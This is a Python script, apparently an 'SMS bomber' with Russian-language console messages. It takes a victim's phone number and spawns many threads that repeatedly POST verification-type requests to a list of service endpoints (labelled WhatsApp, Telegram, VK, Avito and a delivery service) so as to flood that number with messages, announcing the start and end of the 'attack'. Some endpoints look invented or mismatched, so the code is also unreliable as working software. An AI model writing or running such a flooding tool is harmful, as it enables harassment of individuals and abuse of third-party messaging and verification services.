import requests
import time
import threading

class SMSBomber:
    def __init__(self):
        self.services = {
            'whatsapp': 'https://api.whatsapp.com/send?phone=',
            'telegram': 'https://api.telegram.org/sendMessage',
            'vk': 'https://api.vk.com/method/messages.send',
            'avito': 'https://api.avito.ru/sms/send',
            'delivery': 'https://api.delivery.com/sms/verify'
        }
        
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36',
            'Content-Type': 'application/json'
        }

    def send_sms(self, phone, service, count):
        for i in range(count):
            try:
                payload = {
                    'phone': phone,
                    'text': f'Test message {i+1}',
                    'type': 'verification'
                }
                
                response = requests.post(
                    self.services[service],
                    json=payload,
                    headers=self.headers,
                    timeout=10
                )
                
                if response.status_code == 200:
                    print(f"[+] {service} - SMS {i+1} отправлено")
                else:
                    print(f"[-] {service} - Ошибка: {response.status_code}")
                    
            except Exception as e:
                print(f"[!] {service} - Ошибка: {str(e)}")
            
            time.sleep(1)

    def start_attack(self, phone, threads=5, count_per_service=10):
        print(f"[*] Начало атаки на номер: {phone}")
        print(f"[*] Потоков: {threads}")
        print(f"[*] Сообщений на сервис: {count_per_service}")
        
        thread_list = []
        
        for service in self.services:
            for _ in range(threads):
                thread = threading.Thread(
                    target=self.send_sms,
                    args=(phone, service, count_per_service)
                )
                thread_list.append(thread)
                thread.start()
        
        for thread in thread_list:
            thread.join()
            
        print("[*] Атака завершена")

if __name__ == "__main__":
    bomber = SMSBomber()
    
    phone = input("Введите номер телефона: ")
    threads = int(input("Количество потоков: "))
    count = int(input("Количество сообщений на сервис: "))
    
    bomber.start_attack(phone, threads, count)
